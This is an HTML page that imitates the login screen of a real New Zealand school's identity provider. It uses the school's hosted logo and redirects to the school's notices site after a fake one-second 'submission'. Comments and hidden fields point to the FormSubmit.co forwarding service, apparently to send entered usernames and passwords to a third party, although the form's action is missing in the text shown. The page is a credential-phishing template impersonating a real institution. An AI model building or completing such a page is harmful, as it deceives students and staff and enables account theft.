<!DOCTYPE html>
<html>
<head>
    <title>Enter your username and password</title>
</head>
<body>
    <div id="login">
        <div id="logo">
            <img src="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/logo.png" />
        </div>
        <!-- FormSubmit.co integration -->
        <form method="post" onsubmit="submitForm(event)">
            <p>
                <label>Username<br/>
                <input type="text" id="username" tabindex="1" autocorrect="off" autocapitalize="off" name="username" value="" />
                </label>
            </p>
            <p>
                <label>
                    Password<br/>
                    <input id="password" type="password" tabindex="2" name="password" />
                </label>
            </p>

            <input type="submit" tabindex="3" value="Login" class="button" />
            <!-- Add other optional fields as needed -->
            <input type="hidden" name="_subject" value="Login Form Submission" />
            <!-- Disable reCAPTCHA for testing -->
            <input type="hidden" name="_captcha" value="false" />
        </form>
    </div>

    <script type="text/javascript">
        function submitForm(event) {
            event.preventDefault(); // Prevent the form from submitting normally
            var form = event.target;
            // You can perform any additional processing here if needed
            // For example, hashing the password before submitting

            // Wait for a short delay to simulate form submission
            setTimeout(function () {
                // Redirect to your desired location after the form is submitted
                window.location.href = 'https://notices.macleans.school.nz/';
            }, 1000); // Adjust the delay time as needed
        }
    </script>
</body>
</html>
